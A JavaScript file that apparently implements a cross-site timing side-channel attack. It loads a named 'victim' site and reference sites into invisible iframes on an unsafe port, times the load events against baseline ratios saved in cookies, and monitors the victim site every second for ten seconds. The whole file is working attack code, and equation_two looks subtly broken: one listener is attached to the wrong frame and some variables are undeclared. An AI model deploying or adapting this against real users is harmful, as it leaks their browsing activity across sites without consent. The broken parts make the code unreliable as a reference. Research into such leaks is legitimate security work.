const invisible_div = document.getElementById("invisible");
const form = document.getElementById("monitor");
const result = document.getElementById("result");
const submit_button = document.getElementById("submit-btn");

const ref_site_1 = "https://sv.cmu.edu/";
const ref_site_2 = "https://getbootstrap.com/";

function appendTextNode(text, element) {
  const textNode = document.createElement("div");
  textNode.textContent = text;
  element.appendChild(textNode);
}
function now() {
  return new Date().toTimeString().substring(0, 8);
}

window.addEventListener("DOMContentLoaded", async function (event) {
  const { r_np, r_bg } = await load_baseline_result();
  save_baseline_results(r_np, r_bg);
  console.log("baseline result saved in cookie:", document.cookie);
  /* temporary print function */
  appendTextNode(`baseline result saved in cookie: ${document.cookie}`, result);
  submit_button.removeAttribute("disabled");
});

form.addEventListener("submit", async function (e) {
  e.preventDefault();
  const vtm_site = form.site.value;

  /* temporary print function */
  appendTextNode(
    `\n[monitor]: monitor the target site: ${vtm_site} for 10 seconds; start time ${now()}`,
    result
  );

  appendTextNode(`\n[monitor]　　r_vtm　　　time  `, result);

  const intervalId = setInterval(async function () {
    await awaitReset();
    const { r: r_vtm } = await equation_one(vtm_site);
    appendTextNode(`\n[monitor]　　${r_vtm.toFixed(6)}　　　${now()} `, result);
  }, 1000);

  setTimeout(async function () {
    await clearInterval(intervalId);
  }, 10000);
});

async function equation_one(tg_url) {
  let time_0 = performance.now(); // timestamp click the start to monitor
  let time_ref; // reference_site loaded timestamp
  let time_vtm; // reference_site loaded timestamp
  let r; // (time_vtm - time_ref) / (time_ref - time_0);

  const ref_1 = "ref_1";
  create_invisible_iframe(ref_1);
  const ref_frame_1 = document.getElementById(ref_1);
  ref_frame_1.addEventListener("load", () => {
    time_ref = performance.now();
  });
  const tg = "tg";
  create_invisible_iframe(tg);
  const tg_frame = document.getElementById(tg);
  tg_frame.addEventListener("load", () => {
    time_vtm = performance.now();
  });
  await loadURLonFrame(ref_site_1, ref_frame_1);
  await awaitEvent(ref_frame_1, "load");
  await loadURLonFrame(tg_url, tg_frame);
  await awaitEvent(tg_frame, "load");

  r = (time_vtm - time_ref) / (time_ref - time_0);

  // console.log("[equation_one]: {time_0, time_ref, time_vtm, r}", {
  //   time_0,
  //   time_ref,
  //   time_vtm,
  //   r,
  // });
  return { time_0, time_ref, time_vtm, r };
}

async function equation_two(tg_url) {
  let time_0 = performance.now();
  let time_ref;
  let time_vtm;
  let time_vtm_2;
  let r;

  const ref_1 = "ref_1";
  create_invisible_iframe(ref_1);
  const ref_frame_1 = document.getElementById(ref_1);
  ref_frame_1.addEventListener("load", () => {
    time_ref = performance.now();
  });
  await loadURLonFrame(ref_site_1, ref_frame_1);
  await awaitEvent(ref_frame_1, "load");

  const tg = "tg";
  create_invisible_iframe(tg);
  const tg_frame = document.getElementById(tg);
  tg_frame.addEventListener("load", () => {
    time_vtm = performance.now();
  });

  const tg_2 = "tg_2";
  create_invisible_iframe(tg_2);
  const tg_frame_2 = document.getElementById(tg_2);
  tg_frame.addEventListener("load", () => {
    time_vtm_2 = performance.now();
  });

  tg_frame.setAttribute("src", `${tg_url}:1`);
  tg_frame_2.setAttribute("src", `${tg_url}:1`);

  await awaitEvent(tg_frame, "load");
  await awaitEvent(tg_frame_2, "load");
  vtm_t = time_vtm - time_ref;
  vtm_t_2 = time_vtm_2 - time_ref;

  r = (vtm_t_2 - vtm_t) / vtm_t;

  // console.log(
  //   "[equation_two]: {time_0, time_ref, time_vtm, time_vtm_2,vtm_t , vtm_t_2, r}",
  //   {
  //     time_0,
  //     time_ref,
  //     time_vtm,
  //     time_vtm_2,
  //     vtm_t,
  //     vtm_t_2,
  //     r,
  //   }
  // );
  return { time_0, time_ref, time_vtm, r };
}

async function load_baseline_result() {
  const { r: r_np } = await equation_one(ref_site_2);

  await awaitReset();

  const pre_f2 = "pre_f2";
  create_invisible_iframe(pre_f2);
  await loadURLonFrame(ref_site_2, document.getElementById(pre_f2));
  await awaitEvent(document.getElementById(pre_f2), "load");

  const { r: r_bg } = await equation_one(ref_site_2);

  return { r_np, r_bg };
}

function create_invisible_iframe(id) {
  const inv_iframe = document.createElement("iframe");
  inv_iframe.setAttribute("id", id);
  invisible_div.appendChild(inv_iframe);
}

/*
loading a URL: loading a URL with an unsafe port(port1, 22, 23, 24)
victim_site.com = vtm
*/
function loadURLonFrame(url, frame) {
  return new Promise((resolve) => {
    frame.setAttribute("src", `${url}:1`);
    resolve();
  });
}
function awaitReset() {
  return new Promise((resolve) => {
    invisible_div.innerHTML = "";
    resolve();
  });
}

function awaitEvent(element, eventName) {
  return new Promise((resolve) => {
    element.addEventListener(
      eventName,
      () => {
        resolve();
      },
      { once: true }
    );
  });
}

function save_baseline_results(r_np, r_bg) {
  document.cookie = `r_bg=${r_bg}`;
  document.cookie = `r_np=${r_np}`;
}
